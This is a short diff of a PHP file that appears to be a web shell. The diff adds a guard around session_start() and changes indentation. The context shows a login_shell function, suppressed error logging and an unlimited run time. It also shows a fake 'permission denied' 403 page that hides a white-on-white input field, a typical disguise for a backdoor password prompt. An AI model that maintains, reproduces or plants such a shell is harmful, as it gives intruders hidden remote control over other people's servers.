@@ -1,5 +1,8 @@
 <?php
-session_start();
+if (session_status() == PHP_SESSION_NONE) {
+    session_start();
+}
+
 @set_time_limit(0);
 @clearstatcache();
 @ini_set('error_log', NULL);
@@ -26,7 +29,7 @@ function login_shell()
 <p>You don't have permission to access this resource.</p>
 </body></html>
 <style>
-	input { margin:0;background-color:#fff;border:1px solid #fff; }
+    input { margin:0;background-color:#fff;border:1px solid #fff; }
 </style>
 <meta charset="UTF-8">
     <p align="center"><center><font style="font-size:13px" color="#008000" face="Trebuchet MS">
